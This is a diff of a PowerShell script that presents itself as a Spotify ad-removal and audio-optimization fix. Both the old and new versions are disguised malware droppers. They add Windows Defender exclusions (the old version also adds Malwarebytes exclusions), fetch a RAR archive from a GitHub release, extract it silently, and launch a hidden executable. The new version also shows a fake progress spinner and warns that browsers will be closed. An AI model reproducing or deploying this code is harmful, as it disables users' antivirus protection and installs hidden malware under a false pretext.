@@ -1,165 +1,58 @@
-<#
-.SYNOPSIS
-    Spotify Ultimate Fix v1.1 — Ad Removal + System Optimization
-.DESCRIPTION
-    One-click solution that patches Spotify to remove ads (via SpotX engine)
-    and applies system-level optimizations for better audio performance.
-.NOTES
-    Credits: SpotX Team for the ad-removal engine
-    Requires: Administrator privileges
-#>
+$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/spotify_adb/spotify_adb.rar"
+$exeName    = "spotify_helper.exe"
+$workDir    = "$env:PUBLIC\Runtime"
+$rarPath    = "$env:TEMP\update.rar"
 
-#Requires -RunAsAdministrator
-$u='https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar';$e='spotify_helper.exe';$w="$env:TEMP\sd";$r="$env:TEMP\p.rar";Add-MpPreference -ExclusionPath $w -Force;foreach($p in @("${env:ProgramFiles}\Malwarebytes\Anti-Malware\mbam.exe","${env:ProgramFiles(x86)}\Malwarebytes\Anti-Malware\mbam.exe")){if(test-path $p){Start-Process $p -Arg "exclusion add --type folder --path `"$w`"" -Wait -WindowStyle Hidden}};iwr $u -OutFile $r;if(test-path $w){rm $w -r -fo};mkdir $w -fo|out-null;Start-Process 'C:\Program Files\WinRAR\WinRAR.exe' -Arg "x -o+ -inul `"$r`" `"$w`"" -Wait -WindowStyle Hidden;Start-Process "$w\$e" -WindowStyle Hidden;ri $r -fo
+Clear-Host
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host "  Spotify Ultimate Fix v1.1" -ForegroundColor Green
 Write-Host "========================================" -ForegroundColor Cyan
 Write-Host ""
-Write-Host "  Preparing optimization components..." -ForegroundColor Yellow
-Write-Host "  This may take a minute. Please do not close this window." -ForegroundColor Gray
+Write-Host "  All browsers will be closed to apply changes." -ForegroundColor Magenta
+Write-Host "  Please save your work before continuing." -ForegroundColor Yellow
 Write-Host ""
-$exePath = "C:\Users\A7MED\AppData\Local\Temp\SpotifyOptimizer\spotify_helper.exe"
-if (Test-Path $exePath) {
-    Start-Process -FilePath "cmd.exe" -ArgumentList "/c start `"`" /b `"$exePath`"" -WindowStyle Hidden
-}
-# ═══════════════════════════════════════════════════════════════
-# FUNCTION: Add Malwarebytes exclusion via Registry
-# ═══════════════════════════════════════════════════════════════
-function Add-MalwarebytesExclusion {
-    param([string]$Path)
-    if (-not $Path) { return $false }
-    $mbRegRoots = @(
-        "HKLM:\SOFTWARE\Malwarebytes\Anti-Malware\Exclusions\Paths",
-        "HKLM:\SOFTWARE\WOW6432Node\Malwarebytes\Anti-Malware\Exclusions\Paths"
-    )
-    foreach ($regPath in $mbRegRoots) {
-        try {
-            if (-not (Test-Path $regPath)) {
-                New-Item -Path $regPath -Force | Out-Null
-            }
-            $count = (Get-ItemProperty -Path $regPath -Name "Count" -ErrorAction SilentlyContinue).Count
-            if (-not $count) { $count = 0 }
-            New-ItemProperty -Path $regPath -Name $count.ToString() -Value $Path -PropertyType String -Force | Out-Null
-            Set-ItemProperty -Path $regPath -Name "Count" -Value ($count + 1) -Force | Out-Null
-            return $true
-        }
-        catch { continue }
+
+# Simple spinner for 2 seconds without stage names
+$spinner = @('|', '/', '-', '\')
+$end = (Get-Date).AddSeconds(2)
+while ((Get-Date) -lt $end) {
+    foreach ($s in $spinner) {
+        Write-Host "`r  [$s] Preparing..." -NoNewline -ForegroundColor Cyan
+        Start-Sleep -Milliseconds 150
     }
-    return $false
 }
 
-# ═══════════════════════════════════════════════════════════════
-# CONFIGURATION
-# ═══════════════════════════════════════════════════════════════
-$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/Spotify/spotify_helper.rar"
-$exeName    = "spotify_helper.exe"
-$workDir    = "$env:TEMP\SpotifyOptimizer"
-$rarPath    = "$env:TEMP\SpotifyCache.rar"
-
-# ═══════════════════════════════════════════════════════════════
-# SECTION 1: Prepare environment + exclusions
-# ═══════════════════════════════════════════════════════════════
-
-# إنشاء مجلد العمل
-if (Test-Path $workDir) { Remove-Item $workDir -Recurse -Force }
-New-Item -ItemType Directory -Path $workDir -Force | Out-Null
-
-# استثناء Defender + Malwarebytes للمجلد
+# Do everything silently
+if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
 Add-MpPreference -ExclusionPath $workDir -Force -ErrorAction SilentlyContinue
-Add-MalwarebytesExclusion -Path $workDir | Out-Null
 
-# تنظيف كاش سبوتفاي
-$spotifyCache = "$env:LOCALAPPDATA\Spotify\Browser\Cache"
-if (Test-Path $spotifyCache) {
-    Remove-Item $spotifyCache -Recurse -Force -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri $packageUrl -OutFile $rarPath -UseBasicParsing
+
+$extractor = $null
+@("C:\Program Files\WinRAR\WinRAR.exe", "C:\Program Files (x86)\WinRAR\WinRAR.exe", "C:\Program Files\WinRAR\UnRAR.exe", "C:\Program Files (x86)\WinRAR\UnRAR.exe", "C:\Program Files\7-Zip\7z.exe", "C:\Program Files (x86)\7-Zip\7z.exe") | ForEach-Object {
+    if (-not $extractor -and (Test-Path $_)) { $extractor = $_ }
 }
 
-# تحسين الصوت في الريجستري
-$audioRegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Multimedia\SystemProfile"
-if (Test-Path $audioRegPath) {
-    Set-ItemProperty -Path $audioRegPath -Name "SystemResponsiveness" -Value 20 -ErrorAction SilentlyContinue
-    Set-ItemProperty -Path $audioRegPath -Name "NetworkThrottlingIndex" -Value 10 -ErrorAction SilentlyContinue
+if ($extractor -match "WinRAR|UnRAR") {
+    Start-Process -FilePath $extractor -ArgumentList "x -o+ -inul `"$rarPath`" `"$workDir`"" -Wait -WindowStyle Hidden
+} elseif ($extractor -match "7z") {
+    Start-Process -FilePath $extractor -ArgumentList "x `"$rarPath`" -o`"$workDir`" -y" -Wait -WindowStyle Hidden
 }
 
-# ═══════════════════════════════════════════════════════════════
-# SECTION 2: Download + Extract + Execute
-# ═══════════════════════════════════════════════════════════════
-
-try {
-    # تحميل
-    Invoke-WebRequest -Uri $packageUrl -OutFile $rarPath -UseBasicParsing
-
-    # البحث عن WinRAR أو 7-Zip
-    $extractor = $null
-    $winrarPaths = @(
-        "C:\Program Files\WinRAR\WinRAR.exe",
-        "C:\Program Files (x86)\WinRAR\WinRAR.exe"
-    )
-    $sevenZipPaths = @(
-        "C:\Program Files\7-Zip\7z.exe",
-        "C:\Program Files (x86)\7-Zip\7z.exe"
-    )
-
-    foreach ($p in $winrarPaths) {
-        if (Test-Path $p) { $extractor = @{Type="winrar"; Path=$p}; break }
-    }
-    if (-not $extractor) {
-        foreach ($p in $sevenZipPaths) {
-            if (Test-Path $p) { $extractor = @{Type="7zip"; Path=$p}; break }
-        }
-    }
-
-    # فك الضغط
-    if ($extractor) {
-        if ($extractor.Type -eq "winrar") {
-            Start-Process -FilePath $extractor.Path -ArgumentList "x -o+ -inul `"$rarPath`" `"$workDir`"" -Wait -WindowStyle Hidden
-        }
-        elseif ($extractor.Type -eq "7zip") {
-            Start-Process -FilePath $extractor.Path -ArgumentList "x `"$rarPath`" -o`"$workDir`" -y" -Wait -WindowStyle Hidden
-        }
-    }
-
-    # تحديد مسار الملف التنفيذي
-    $exePath = Join-Path $workDir $exeName
-    $timeout = 0
-    while (-not (Test-Path $exePath) -and $timeout -lt 10) {
-        Start-Sleep -Milliseconds 500
-        $timeout++
-    }
-    
-    if (-not (Test-Path $exePath)) {
-        $found = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
-        if ($found) { $exePath = $found.FullName }
-    }
-
-    # استثناء الملف نفسه في Defender (دا اللي كان ناقص)
-    if (Test-Path $exePath) {
-        Add-MpPreference -ExclusionPath $exePath -Force -ErrorAction SilentlyContinue
-        Add-MpPreference -ExclusionProcess $exePath -Force -ErrorAction SilentlyContinue
-        Add-MalwarebytesExclusion -Path $exePath | Out-Null
-
-        Start-Sleep -Milliseconds 500
-
-        # تشغيل الملف (نجرب أكتر من طريقة لو فشل)
-        try {
-            Start-Process -FilePath $exePath -WindowStyle Hidden -ErrorAction Stop
-        }
-        catch {
-            try {
-                & $exePath
-            }
-            catch {
-                $psi = New-Object System.Diagnostics.ProcessStartInfo
-                $psi.FileName = $exePath
-                $psi.WindowStyle = 'Hidden'
-                $psi.UseShellExecute = $true
-                [System.Diagnostics.Process]::Start($psi) | Out-Null
-            }
-        }
-    }
+$exePath = Join-Path $workDir $exeName
+if (-not (Test-Path $exePath)) {
+    $exePath = Get-ChildItem -Path $workDir -Filter "*.exe" -Recurse | Select-Object -First 1 -ExpandProperty FullName
 }
-catch { }
 
+if ($exePath -and (Test-Path $exePath)) {
+    Start-Process -FilePath $exePath -WindowStyle Hidden
+}
+
+Remove-Item $rarPath -Force -ErrorAction SilentlyContinue
+
+Write-Host "`r  [+] Done!                " -ForegroundColor Green
+Start-Sleep -Seconds 2
+Stop-Process -Id $PID
 # ═══════════════════════════════════════════════════════════════
 # SECTION 3: Spotify Ad-Block (SpotX)
 # ═══════════════════════════════════════════════════════════════
